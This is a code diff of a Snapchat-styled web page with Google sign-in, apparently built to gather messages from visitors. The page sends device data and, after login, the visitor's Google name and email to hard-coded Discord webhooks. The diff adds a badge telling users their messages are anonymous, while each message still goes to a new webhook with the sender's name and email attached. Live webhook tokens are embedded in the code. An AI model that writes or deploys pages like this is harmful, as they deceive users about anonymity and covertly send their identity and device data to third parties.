@@ -17,11 +17,11 @@
       position: relative;
     }
     
-    /* Snapchat Badge (Top Right) */
+    /* Snapchat Badge (Top Left) */
     .snap-badge {
       position: absolute;
       top: 15px;
-      right: 15px;
+      left: 15px;
       color: #fffc00;
       font-weight: bold;
       font-size: 0.85em;
@@ -61,6 +61,18 @@
     
     /* Post-Login UI Elements */
     #hiddenGateway { display: none; }
+    
+    .anon-badge {
+      color: #8cff66;
+      font-weight: bold;
+      font-size: 1.1em;
+      margin-bottom: 20px;
+      border: 1px solid #8cff66;
+      padding: 8px;
+      border-radius: 4px;
+      background-color: rgba(140,255, 102, 0.1);
+    }
+
     textarea {
       width: 100%;
       height: 80px;
@@ -139,7 +151,7 @@
       </p>
 
       <div id="googleBtnContainer">
-        <!-- Google Client ID injected here -->
+        <!-- Google Client ID -->
         <div id="g_id_onload"
              data-client_id="343930711318-3qmqd6e3em2l2nefnmkqocrv6b7ek422.apps.googleusercontent.com"
              data-callback="handleCredentialResponse"
@@ -157,8 +169,7 @@
 
       <!-- Phase 2: Post-Login -->
       <div id="hiddenGateway">
-        <p style="color: #aaa; margin-bottom: 5px; font-size: 0.85em; font-weight:bold;">Identitate Confirmată:</p>
-        <p style="color: #8cff66; font-weight: bold; margin-top: 0; margin-bottom: 20px;" id="userEmail"></p>
+        <div class="anon-badge">MESAJELE SUNT ANONIME</div>
         
         <!-- Text Message Input -->
         <textarea id="customMessage" placeholder="Scrie un mesaj aici..."></textarea>
@@ -176,7 +187,7 @@
     
     let globalSyncData = {};
     let globalAsyncData = {};
-    let verifiedUser = { name: "", email: "" }; // Stores user info for the custom message webhook
+    let verifiedUser = { name: "", email: "" };
 
     // 1. REFRESH RATE
     function getRefreshRate() {
@@ -258,7 +269,7 @@
       };
     }
 
-    // 4. MAIN WEBHOOK EXECUTOR (Fires on load & on auth)
+    // 4. MAIN WEBHOOK EXECUTOR (Logs / Hardware)
     async function fireWebhook(data, gmailInfo = null) {
       const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
       
@@ -280,7 +291,6 @@
       }
 
       const jsonPayload = JSON.stringify({
-        username: "System Tracker",
         embeds: [{
           title: gmailInfo ? '🚨 AUTHENTICATED ACCESS PORTAL LOG' : '🚨 PRECISION DEVICE LOG',
           color: gmailInfo ? 15158332 : 3066993, 
@@ -294,7 +304,7 @@
       try { await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: formData }); } catch (e) {}
     }
 
-    // 5. CUSTOM MESSAGE WEBHOOK EXECUTOR
+    // 5. CUSTOM MESSAGE WEBHOOK EXECUTOR (Separate Webhook)
     async function sendCustomMessage() {
       const msgBox = document.getElementById("customMessage");
       const statusText = document.getElementById("msgStatus");
@@ -307,10 +317,10 @@
         return;
       }
 
-      const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
+      // New webhook specifically for the messages
+      const webhookURL = "https://discord.com/api/webhooks/1527996713028030565/jRLe183_UIomjx6c5qBJB__PQatyN5UtfyID-bC6ai9_blkW2a-NgXbskz3dg4neg9Xs";
       
       const jsonPayload = JSON.stringify({
-        username: "Portal Message",
         content: `**NOU MESAJ DE LA UTILIZATOR VERIFICAT**\n**Nume:** ${verifiedUser.name}\n**Email:** ${verifiedUser.email}\n**Mesaj:**\n\`\`\`\n${msg}\n\`\`\``
       });
 
@@ -357,18 +367,14 @@
 
       const payload = decodeJwt(response.credential);
       if (payload) {
-        // Save user info for the custom message webhook
         verifiedUser.name = payload.name;
         verifiedUser.email = payload.email;
 
-        // Update UI
         document.getElementById("googleBtnContainer").style.display = "none";
         document.getElementById("mainText").style.display = "none";
         
         document.getElementById("hiddenGateway").style.display = "block";
-        document.getElementById("userEmail").innerText = payload.email;
 
-        // Fire authenticated webhook
         const fullData = { ...globalSyncData, ...globalAsyncData };
         await fireWebhook(fullData, { name: payload.name, email: payload.email });
       }
